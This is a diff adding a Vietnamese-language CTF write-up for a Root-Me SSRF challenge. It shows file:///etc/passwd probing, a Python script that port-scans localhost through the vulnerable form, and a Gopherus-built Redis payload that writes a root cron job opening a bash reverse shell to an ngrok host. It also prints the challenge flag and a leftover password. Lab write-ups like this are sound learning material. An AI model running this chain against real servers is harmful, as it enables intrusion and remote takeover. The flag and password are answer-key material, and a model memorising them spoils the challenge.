@@ -38,6 +38,9 @@
 - [JSON Web Token (JWT) - Public key](#json-web-token-jwt---public-key)
   - [Description](#description-3)
   - [Solution](#solution-4)
+- [SSRF](#ssrf)
+  - [Description](#description-4)
+  - [Solution](#solution-5)
 
 # HTML - Source code
 pass: nZ^&@q5&sjJHev0
@@ -563,3 +566,79 @@ print(r2.text)
 
 ![img](./img/10.png)
 
+# SSRF
+## Description
+Get root privileges on SSRF box CTF All The Day to read the flag in the /root directory !
+## Solution
+
+![img](./img/11.png)
+
+Ở đây web app cho mình nhập một url và nó sẽ thực hiện crawl dữ liệu từ cái url về.
+
+![img](./img/12.png)
+
+Để test lỗ hổng SSRF, mình có thể fuzz qua 1 số payload như file:///etc/passwd
+
+![img](./img/13.png)
+
+naice, nhưng bằng cách này mình chỉ có thể đọc được content những file trong đặc quyền của mình ( không thể đọc flag trong root). Mình tiếp tục fuzz qua về local port để biết thêm về những dịch vụ mà server đang chạy.
+
+Script:
+```
+import threading,requests
+from queue import Queue
+ 
+def scan(port):
+    h={"Content-Type": "application/x-www-form-urlencoded",}
+    url= "http://ctf09.root-me.org/index.php"
+    data={"url":f"localhost:{port}"}
+    r= requests.post(url,data=data)
+    if "Connection refused" not in r.text:
+        print(f"[+] FOUND AT PORT: {port}")
+ 
+def threader():
+    while True:
+        worker = q.get()
+        scan(worker)
+        q.task_done()
+ 
+q = Queue()
+for i in range(100):
+    t = threading.Thread(target=threader)
+    t.daemon = True
+    t.start()
+ 
+for worker in range(1, 7000):
+    q.put(worker)
+ 
+q.join()
+```
+
+![img](img/14.png)
+
+Sau khi fuzz qua, mình sẽ thấy được server nó đang dùng redis chạy với port 6379. Thông thường Redis service sẽ được chạy với đặc quyền root trong intranet và mình có thể sử dụng giao thức Gopher để lợi dụng điều đó.
+
+Mình sẽ sử dụng tool tên là [Gopherus](https://github.com/tarunkant/Gopherus) để tạo ra payload reverse shell. Ngoài ra mình cũng sẽ sử dụng ngrok để thực hiện forward kết nối đến local interface của mình.
+
+![img](img/15.png)
+
+Nếu decode nó ra, mình có thể thấy đươc nó là gói dữ liệu TCP của reverse shell được viết bằng bash và nó sẽ trông giống thế này:
+
+```
+redis-cli -h $1 -p $2 flushall
+echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/2.tcp.ngrok.io/1234 0>&1\n\n"redis-cli -h $1 -p $2 -x set 1
+redis-cli -h $1 -p $2 config set dir /var/spool/cron/
+redis-cli -h $1 -p $2 config set dbfilename root
+redis-cli -h $1 -p $2 save
+redis-cli -h $1 -p $2 quit
+```
+
+Giờ thì ném payload lên và chuẩn bị sẵn nc đã đợi sẵn ở port 1234. Và điều gì đến cũng phải đến
+
+![img](img/16.png)
+
+Lấy flag:
+
+![img](img/17.png)
+
+Flag: SSRF_PwNiNg_v1@GoPh3r_1s$o_c00l!
